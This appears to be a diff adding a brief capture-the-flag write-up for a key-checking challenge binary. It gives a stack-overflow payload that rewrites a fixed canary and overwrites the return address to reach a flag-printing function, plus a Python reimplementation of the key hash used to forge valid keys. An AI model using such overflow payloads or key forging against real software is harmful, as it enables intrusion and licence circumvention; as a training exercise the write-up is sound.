@@ -1,0 +1,45 @@
+Flag 1 was a stack overflow on the key input. The key was 32 bytes but 64 were read, letting us overwrite the return value to the function that reads in and prints the key. There is a canary 0xDEADBEEF but we can just re-add that to the stack in the right posision.
+
+read_flag_addr = 0x8049855 # print pwn flag
+
+
+payload += p32(0)
+payload += p32(0xDEADBEEF)
+payload += p32(0)
+payload += p32(0)
+payload += p32(0)
+payload += p32(read_flag_addr)
+
+
+io.sendline(payload)
+
+The second flag is hidden behind having a valid key. Looking at the validation function a valid key just needs to have the second half of the key match the output of hashing the second set of 8 bits with an internal hash function. Reimplementing the hash funciton in python lets us generate arbitrary valid keys.
+
+________allaaaaalhwpppppahhaaaaa
+
+def hash_function(input_str: str) -> str:
+
+    var_10 = 0x539  # 1337 decimal
+    output_chars = [''] * 16  
+    for i in range(8):
+        c_val = ord(input_str[i]) - ord('a')
+        
+        # ( (2 * c_val) + var_10 ) % 26
+        ecx_2 = ((2 * c_val) + var_10) % 26  
+        # (3 * c_val) % 26
+        ecx_4 = (3 * c_val) % 26
+
+        # Update var_10
+        var_10 = ecx_2 - ecx_4
+        
+        # Map 0..25 back to 'a'..'z'
+        output_chars[i]     = chr(ecx_2 + ord('a'))
+        output_chars[i + 8] = chr(ecx_4 + ord('a'))
+
+    return ''.join(output_chars)
+
+if __name__ == "__main__":
+    test_input = "allaaaaa"
+    hashed = hash_function(test_input)
+    print(f"Input:  {test_input}")
+    print(f"Output: {hashed}")
